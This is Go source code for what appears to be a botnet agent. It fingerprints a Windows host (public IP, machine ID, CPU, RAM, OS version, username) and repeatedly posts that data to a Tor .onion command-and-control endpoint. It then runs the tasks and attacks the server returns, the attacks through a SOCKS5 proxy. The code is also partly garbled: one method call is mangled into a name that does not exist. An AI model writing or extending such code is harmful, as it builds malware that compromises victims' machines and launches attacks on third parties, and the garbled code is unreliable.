package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/user"
	"strings"
	"time"

	"github.com/denisbrodbeck/machineid"
	"github.com/klauspost/cpuid"
	"github.com/pbnjay/memory"
	"golang.org/x/sys/windows/registry"
)

type Handler struct {
	config Config

	knockJSON KnockJSON
}

func (h *Handler) Init(config Config) error {
	h.config = config

	err := h.GeknockJSON.IPtIP()
	if err != nil {
		return err
	}
	err = h.GetHWID()
	if err != nil {
		return err
	}
	h.GetCPU()
	h.GetRAM()
	err = h.GetOS()
	if err != nil {
		return err
	}
	err = h.GetUsername()
	if err != nil {
		return err
	}

	errorChan := make(chan error)
	go func() {
		for {
			err := h.Do(config.userAgent, fmt.Sprintf("socks5://%s:8001", h.knockJSON.IP))
			if err != nil {
				errorChan <- err
				return
			}
			time.Sleep(time.Second * time.Duration(h.config.interval))
		}
	}()
	return <-errorChan
}

func (h *Handler) Do(userAgent, proxy string) error {
	jsonBytes, err := json.Marshal(h.knockJSON)
	if err != nil {
		return err
	}
	postData := bytes.NewBuffer(jsonBytes)
	request, err := http.NewRequest("POST",
		fmt.Sprintf("http://%s.onion/api/docking/knock", h.config.torID), postData)
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/json")
	request.Header.Set("User-Agent", userAgent)

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()

	responseBody, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	var jsonResponse Response
	err = json.Unmarshal(responseBody, &jsonResponse)
	if err != nil {
		return err
	}
	fmt.Println(jsonResponse)

	for _, task := range jsonResponse.Tasks {
		go ParseTask(task)
	}
	for _, attack := range jsonResponse.Attacks {
		go ParseAttack(attack, h.config, proxy)
	}
	return nil
}

func (h *Handler) GetIP() error {
	url := "https://api.ipify.org?format=text"
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	ip, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	h.knockJSON.IP = string(ip)
	return nil
}

func (h *Handler) GetHWID() error {
	id, err := machineid.ID()
	if err != nil {
		return err
	}
	h.knockJSON.HWID = id
	return nil
}

func (h *Handler) GetCPU() {
	h.knockJSON.CPU = cpuid.CPU.BrandName
}

func (h *Handler) GetRAM() {
	h.knockJSON.RAM = fmt.Sprintf("%d", memory.TotalMemory()/1024/1024)
}

func (h *Handler) GetOS() error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`,
		registry.QUERY_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	majorNumber, _, err := key.GetIntegerValue("CurrentMajorVersionNumber")
	if err != nil {
		return err
	}
	h.knockJSON.OS = fmt.Sprintf("Windows %d", majorNumber)
	return nil
}

func (h *Handler) GetUsername() error {
	user, err := user.Current()
	if err != nil {
		return err
	}
	h.knockJSON.Username = strings.Split(user.Username, "\\")[1]
	return nil
}
